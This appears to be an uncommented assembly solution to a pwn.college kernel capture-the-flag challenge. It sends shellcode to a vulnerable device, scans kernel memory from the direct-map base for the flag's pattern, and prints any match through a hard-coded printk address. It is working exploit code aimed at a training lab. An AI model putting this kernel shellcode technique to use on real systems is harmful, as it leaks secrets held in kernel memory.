.global _start
.intel_syntax noprefix
_start: 
    mov rax, 1
    lea rsi, [rip+kernel_shellcode]
    mov rdi, 3
    mov rdx, 0x100
    syscall

    ret

kernel_shellcode:
    mov r15, 0xffff888000000000

jump:

    xor rdi, rdi
    mov dil, byte ptr [rip+check] 
    xor r14, r14
    mov r14b, byte ptr [r15]
    cmp rdi, r14
    jne fail

    xor rdi, rdi
    mov dil, byte ptr [rip+check2] 
    xor r14, r14
    mov r14b, byte ptr [r15+11]
    cmp rdi, r14
    jne fail

    lea rsi, [r15]
    lea rdi, [rip+printk]
    mov rbx, 0xffffffff810b6309
    call rbx
fail:
    add r15, 8
    jmp jump

    ret
check:
    .string "pwn.coll"

check2:
    .string "{"

printk:
    .string "ptr=%s"
    